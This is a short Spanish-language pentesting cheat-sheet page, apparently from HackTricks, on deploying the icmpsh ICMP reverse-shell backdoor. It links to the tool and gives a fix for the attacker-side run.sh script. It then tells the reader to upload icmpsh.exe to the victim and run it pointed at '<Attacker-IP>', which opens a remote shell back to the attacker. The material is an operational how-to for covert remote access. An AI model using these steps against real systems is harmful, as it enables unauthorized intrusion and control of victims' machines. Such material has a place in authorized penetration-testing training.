{{#include ../banners/hacktricks-training.md}}

Descarga el backdoor desde: [https://github.com/inquisb/icmpsh](https://github.com/inquisb/icmpsh)

# Lado del cliente

Ejecuta el script: **run.sh**

**Si obtienes algún error, intenta cambiar las líneas:**
```bash
IPINT=$(ifconfig | grep "eth" | cut -d " " -f 1 | head -1)
IP=$(ifconfig "$IPINT" |grep "inet addr:" |cut -d ":" -f 2 |awk '{ print $1 }')
```
**Para:**
```bash
echo Please insert the IP where you want to listen
read IP
```
# **Lado de la Víctima**

Sube **icmpsh.exe** a la víctima y ejecuta:
```bash
icmpsh.exe -t <Attacker-IP> -d 500 -b 30 -s 128
```
{{#include ../banners/hacktricks-training.md}}
